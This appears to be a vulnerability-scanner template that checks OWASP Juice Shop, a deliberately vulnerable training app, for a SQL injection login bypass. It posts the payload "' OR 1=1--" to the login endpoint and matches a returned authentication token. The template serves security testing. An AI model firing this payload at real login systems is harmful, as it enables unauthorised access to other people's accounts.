id: juiceshop-sqli-login-bypass

info:
  name: OWASP Juice Shop SQL injection login bypass
  author: Threshold
  severity: critical
  description: The Juice Shop login endpoint accepts a SQL injection that returns an authenticated token.
  tags: juiceshop,sqli,auth-bypass

http:
  - method: POST
    path:
      - "{{RootURL}}/rest/user/login"
    headers:
      Content-Type: application/json
      Accept: application/json
    body: |
      {"email":"' OR 1=1--","password":"ThresholdSecurityCheck"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"authentication"'
          - '"token"'
        condition: and
